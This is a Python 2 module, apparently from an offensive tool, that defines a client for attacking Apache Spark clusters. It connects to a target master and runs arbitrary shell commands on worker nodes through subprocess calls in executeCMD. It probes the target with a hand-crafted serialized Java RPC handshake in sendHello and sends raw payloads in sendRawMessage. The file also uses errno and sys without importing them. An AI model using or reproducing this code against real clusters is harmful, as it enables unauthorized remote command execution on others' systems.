from pyspark import SparkConf, SparkContext
from general import whine
import random, time
import logging
import subprocess, os, struct, socket


class SparkClient:
    def __init__(self, target, port, localIP, appName, username):
        self.target = target
        self.port = port
        self.logLevel = "FATAL"
        self.localIP = localIP
        self.sc = None
        self.appName = appName
        self.username = username
        self.version = ""
        self.secret = None
        self.requiresAuthentication = False
        self.useShotgun = False

    def initContext(self, authenticate, secret):
        os.environ["SPARK_LOCAL_IP"] = self.localIP
        conf = SparkConf().setAppName(self.appName)
        conf = conf.setMaster("spark://%s:%d" % (self.target, self.port))
        conf = conf.set(
            "spark.driver.extraJavaOptions", "-Duser.name=%s" % self.username
        )
        conf = conf.set("spark.local.ip", self.localIP)
        conf = conf.set("spark.driver.host", self.localIP)
        if authenticate:
            conf = conf.set("spark.authenticate", "true")
            conf = conf.set("spark.authenticate.secret", secret)
        self.sc = SparkContext(conf=conf)
        self.sc.setLogLevel(self.logLevel)

    def isReady(self):
        if self.sc is None:
            return False
        return True

    def performWork(self):
        if not self.isReady():
            return None
        count = self.sc.parallelize(xrange(0, 1), 10).filter(lambda x: x + 1).count()

    def listNodes(self):
        if not self.isReady():
            return None
        self.performWork()
        return self.sc._jsc.sc().getExecutorMemoryStatus()

    def getVersion(self):
        try:
            self.version = str(self.sc.version)
            return True
        except Exception as e:
            whine("Could not get Spark version - %s " % e, "err")
            return False

    def executeCMD(self, interpreterArgs, numWorkers=1):
        if not self.isReady():
            return None
        out = []
        mylist = self.sc.parallelize(xrange(0, numWorkers), numWorkers).map(
            lambda x: subprocess.Popen(
                interpreterArgs, stdout=subprocess.PIPE
            ).stdout.read()
        )
        for a in mylist.collect():
            out.append(a)
        return out

    def sendHello(self):
        nonce = "\x00\x00\x00\x00\x00\x00\x00\xc5\x03\x62\x05\x32\x92\xe7\xca\x6d\xaa\x00\x00\x00\xb0"
        hello = (
            "\x01\x00\x0c\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x31\x00"
            "\x00\xe7\x44\x01\x00\x0c\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e"
            "\x32\x38\x00\x00\x1b\xa5\x00\x11\x65\x6e\x64\x70\x6f\x69\x6e\x74"
            "\x2d\x76\x65\x72\x69\x66\x69\x65\x72\xac\xed\x00\x05\x73\x72\x00"
            "\x3d\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x73\x70\x61\x72"
            "\x6b\x2e\x72\x70\x63\x2e\x6e\x65\x74\x74\x79\x2e\x52\x70\x63\x45"
            "\x6e\x64\x70\x6f\x69\x6e\x74\x56\x65\x72\x69\x66\x69\x65\x72\x24"
            "\x43\x68\x65\x63\x6b\x45\x78\x69\x73\x74\x65\x6e\x63\x65\x6c\x19"
            "\x1e\xae\x8e\x40\xc0\x1f\x02\x00\x01\x4c\x00\x04\x6e\x61\x6d\x65"
            "\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74"
            "\x72\x69\x6e\x67\x3b\x78\x70\x74\x00\x06\x4d\x61\x73\x74\x65\x72"
        )
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (self.target, self.port)
            sock.settimeout(3)
            sock.connect(server_address)
            sock.send(nonce)
            sock.send(hello)
            respNone = sock.recv(21)
            respNone2 = sock.recv(200)
            if "Expected SaslMessage" in respNone2:
                self.requiresAuthentication = True
            if len(respNone) == 21 and respNone[10] == nonce[10]:
                return True

        except socket.error as serr:
            if serr.errno == errno.ECONNREFUSED:
                whine(serr, "err")
                sys.exit(-1)
            whine(serr, "warn")
            return False

    def sendRawMessage(self, payload):
        payloadSize = struct.pack(">I", len(payload))
        payloadSize13 = struct.pack(">I", len(payload) + 13)
        nonce = "\x00\x00\x00\x00" + payloadSize13 + "\x09" + payloadSize
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (self.target, self.port)
        sock.settimeout(3)
        sock.connect(server_address)
        sock.send(nonce)
        sock.send(payload)
        respNone = sock.recv(13)
        respNone = sock.recv(2048)
        if "RegisteredApplication" in respNone:
            time.sleep(2)
            return True
        return False

    def __del__(self):
        os.environ["SPARK_LOCAL_IP"] = ""
